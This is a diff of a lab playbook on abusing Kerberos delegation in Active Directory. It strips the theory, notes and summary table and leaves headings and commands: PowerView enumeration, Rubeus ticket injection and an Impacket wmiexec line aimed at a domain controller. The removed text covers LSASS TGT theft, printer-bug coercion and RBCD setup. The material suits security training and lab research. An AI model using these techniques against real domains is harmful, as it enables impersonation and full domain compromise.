@@ -1,39 +1,6 @@
-# Kerberos Delegation Abuse Playbook
-
-**Lab domain:** `warzone.oxsium.local`
-**Domain controller:** `WIN-WARZONE.warzone.oxsium.local`
-**Tooling path:** `C:\Tools` (PowerView.ps1, Rubeus.exe, mimikatz.exe, SharpHound.exe, Snaffler.exe, Whisker.exe)
-
-This playbook documents four Kerberos delegation abuse scenarios built and tested in an isolated Active Directory lab: Unconstrained Delegation, Constrained Delegation with Protocol Transition, Constrained Delegation without Protocol Transition, and Resource-Based Constrained Delegation (RBCD).
-
----
-
-## 1. Background: Delegation Types in the GUI
-
-```text
-Do not trust this computer for delegation                         - No Delegation
-Trust this computer for delegation to any service (Kerberos only)  - Unconstrained Delegation
-Trust this computer for delegation to specified services only      - Constrained Delegation
-    Use Kerberos only                                               - Constrained, no Protocol Transition
-    Use any authentication protocol                                 - Constrained, with Protocol Transition
-(Resource-Based Constrained Delegation is configured on the *target*
- object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, not here)
-```
-
-| Scenario | Object Type | Name | Required Attribute |
-|---|---|---|---|
-| 1. Unconstrained | Computer | `UNCON-PC$` | `TrustedForDelegation = True` |
-| 2. Constrained (with PT) | User | `unconstrained-svc` | SPN + `msDS-AllowedToDelegateTo` + `TrustedToAuthForDelegation = True` |
-| 3. Constrained (no PT) | User | `constrained-svc` | SPN + `msDS-AllowedToDelegateTo`, `TrustedToAuthForDelegation = False` (default) |
-| 4. RBCD | Computer | `RBCD-PC$` | No delegation flags on itself; `msDS-AllowedToActOnBehalfOfOtherIdentity` set to attacker-controlled principal |
-
----
+# Delegation
 
 ## 2. Unconstrained Delegation
-
-### 2.1 Theory
-
-A computer or service account flagged `TRUSTED_FOR_DELEGATION` (`userAccountControl` bit `0x80000`) caches the **full forwardable TGT** of any user who authenticates to it via Kerberos. If an attacker gains SYSTEM on that host, they can extract any cached TGT from LSASS memory — including a Domain Admin's — without needing that user's credentials at all. The classic trigger is forcing privileged authentication via a coercion bug (e.g. the MS-RPRN "PrinterBug").
 
 ### 2.2 Enumeration
 
@@ -82,11 +49,6 @@ Import-Module .\PowerView.ps1
 .\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
 ```
 
-**Notes:**
-- `Rubeus.exe monitor` only has access to cached TGTs if run as SYSTEM on `UNCON-PC` itself (e.g. via `PsExec64.exe -s`).
-- `SpoolSample.exe` is not part of the default tool set in `C:\Tools` — it (or an equivalent printer-bug/coercion tool) needs to be added separately.
-- Replace `Administrator` in `/filteruser` with the actual privileged account name being targeted in the lab.
-
 ---
 
 ## 3. Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)
@@ -113,10 +75,6 @@ python3 /home/sako/Tools/Impacket/examples/wmiexec.py -k -no-pass dc.redelegate.
 
 ## 4. Constrained Delegation without Protocol Transition (Use Kerberos only)
 
-### 4.1 Theory
-
-Without `TRUSTED_TO_AUTH_FOR_DELEGATION` set, S4U2Self still succeeds for any account, but the resulting ticket is **not forwardable**. S4U2Proxy will reject a non-forwardable ticket, so the attacker cannot fabricate impersonation of an arbitrary user purely from the compromised account's credentials. Real impersonation under this configuration requires the attacker to already hold a genuine forwardable TGT/TGS for the target user (e.g. captured via an unconstrained delegation host or other coercion technique), which is then relayed through S4U2Proxy.
-
 ### 4.2 Enumeration
 
 ```powershell
@@ -130,8 +88,6 @@ Get-DomainUser -AllowDelegation | Where-Object { $_.useraccountcontrol -notmatch
 Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*" -and TrustedToAuthForDelegation -eq $false} `
     -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation, ServicePrincipalName
 ```
-
-This isolates constrained-delegation accounts that are restricted to "Kerberos only." These are lower risk than their Protocol-Transition counterparts on their own, but become dangerous when chained with another technique that supplies a real forwardable ticket for the target user.
 
 ### 4.3 Lab Setup
 
@@ -170,20 +126,9 @@ Get-ADUser -Identity "constrained-svc" -Properties TrustedToAuthForDelegation, m
     /ptt
 ```
 
-Compare this directly against Scenario 3 (with PT) using the same `/impersonateuser:Administrator` target: the PT version succeeds and grants access, while this one is rejected at the S4U2Proxy stage — illustrating why "Use Kerberos only" is meaningfully safer.
-
 ---
 
 ## 5. Resource-Based Constrained Delegation (RBCD)
-
-### 5.1 Theory
-
-RBCD inverts where trust is configured: instead of the delegating account holding a list of allowed targets, the **target object** holds a list of principals allowed to act on its behalf, in `msDS-AllowedToActOnBehalfOfOtherIdentity`. This means an attacker needs no special configuration on a "delegating" account — only:
-
-1. The ability to create a computer object (default `ms-DS-MachineAccountQuota` allows any domain user to create up to 10), and
-2. Write-level permission (`GenericWrite`, `GenericAll`, or similar) over some target computer/service object.
-
-With both, the attacker creates their own computer account, writes its SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity`, then uses S4U2Self + S4U2Proxy from their own account to impersonate any user against the target.
 
 ### 5.2 Enumeration
 
@@ -205,8 +150,6 @@ Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQu
 Get-DomainObjectAcl -Identity "RBCD-PC" -ResolveGUIDs | `
     Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" }
 ```
-
-The first two queries find delegation that's already configured (post-compromise persistence indicator). The quota and ACL checks are pre-attack reconnaissance: they tell you whether you, as a low-privileged user, currently have the prerequisites to set up an RBCD attack against a given target.
 
 ### 5.3 Lab Setup — Target Object
 
@@ -262,23 +205,3 @@ $rbcd.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access
 klist
 ls \\RBCD-PC.warzone.oxsium.local\C$
 ```
-
-**Confirmed lab result:** `S4U2self success!` → `S4U2proxy success!` → `Ticket successfully imported!`, followed by successful access to `\\RBCD-PC.warzone.oxsium.local\C$`.
-
-**Key troubleshooting notes from this lab run:**
-- `Rubeus.exe s4u` requires `/rc4` or `/aes256` — never `/password`.
-- `KDC_ERR_S_PRINCIPAL_UNKNOWN` during S4U2Proxy almost always means the target SPN was never registered with `setspn -A` on the target computer account — this was the root cause of repeated failures until the SPN was added.
-- `/ptt` injects the ticket directly into the current logon session's memory; it does not write a `.kirbi` file to disk. Use `/outfile:name` instead of (or alongside) `/ptt` if a ticket file is needed for separate analysis or import.
-- `New-MachineAccount` is not present in all PowerView forks; `New-ADComputer` (AD module) plus `setspn` works as a reliable substitute when the function is missing. `Convert-NameToSid` was available in this lab's PowerView build.
-- `Remove-Computer` unjoins a *local* machine from the domain — it does not delete an AD computer object. Use `Remove-ADComputer` to delete an AD object.
-
----
-
-## 6. Summary Comparison
-
-| Scenario | Trust Location | Impersonate Arbitrary User? | Key Risk Factor |
-|---|---|---|---|
-| Unconstrained | Delegating account (`TrustedForDelegation`) | Yes, if victim authenticates to host | Coercion + SYSTEM access to host |
-| Constrained + PT | Delegating account (`msDS-AllowedToDelegateTo` + `TrustedToAuthForDelegation`) | Yes, via S4U2Self | Compromised credentials (e.g. Kerberoast) |
-| Constrained, no PT | Delegating account (`msDS-AllowedToDelegateTo` only) | No, unless attacker already holds victim's forwardable ticket | Lower risk alone; dangerous when chained |
-| RBCD | Target object (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | Yes, via attacker's own created computer account | `GenericWrite`/`GenericAll` ACL + MachineAccountQuota |
